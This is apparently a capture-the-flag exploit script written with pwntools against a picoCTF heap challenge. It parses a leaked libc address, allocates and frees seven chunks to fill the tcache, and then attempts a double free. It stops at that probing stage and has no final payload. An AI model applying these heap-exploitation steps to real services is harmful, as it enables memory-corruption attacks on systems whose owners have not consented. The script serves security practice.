#!/usr/bin/env python3

from pwn import *

HOST = 'jupiter.challenges.picoctf.org'
PORT = 29476

context.log_level = 'info'

p = remote(HOST, PORT)

# Initial dialog - only ONE response needed!
p.recvuntil(b'So, you want to be a hero?')
p.sendline(b'y')

# Now we get the rest including the leak and menu
data = p.recvuntil(b'>')
log.info(f"Received: {data}")

# Extract leak
if b'Take this: ' in data:
    leak_line = data.split(b'Take this: ')[1].split(b'\n')[0]
    leak = int(leak_line, 16)
    log.info(f"Leak: 0x{leak:x}")
    
    libc_base = leak - 0x21fd0
    log.info(f"Libc base: 0x{libc_base:x}")

# Now we're at the menu, test allocation
p.sendline(b'1')
response = p.recvuntil(b'length')
log.info("Asked for length")

p.sendline(b'100')
response = p.recvuntil(b'description')
log.info("Asked for description")

p.sendline(b'A' * 100)
response = p.recvuntil(b'>')
log.info("Back at menu - allocation successful!")

# Allocate more
for i in range(6):
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'100')
    p.recvuntil(b'description')
    p.sendline(chr(ord('B') + i).encode() * 100)
    p.recvuntil(b'>')
    log.info(f"Allocated chunk {i+1}")

# Now we have 7 chunks (0-6)
# Free some for tcache
for i in range(7):
    p.sendline(b'2')
    p.recvuntil(b'remove')
    p.sendline(str(i).encode())
    p.recvuntil(b'>')
    log.info(f"Freed chunk {i}")

# Now try double free
p.sendline(b'2')
p.recvuntil(b'remove')
p.sendline(b'0')  # Double free chunk 0!

log.info("Attempted double free")

try:
    response = p.recv(1024, timeout=1)
    log.info(f"Response: {response}")
except:
    log.info("No response or crash")

p.close()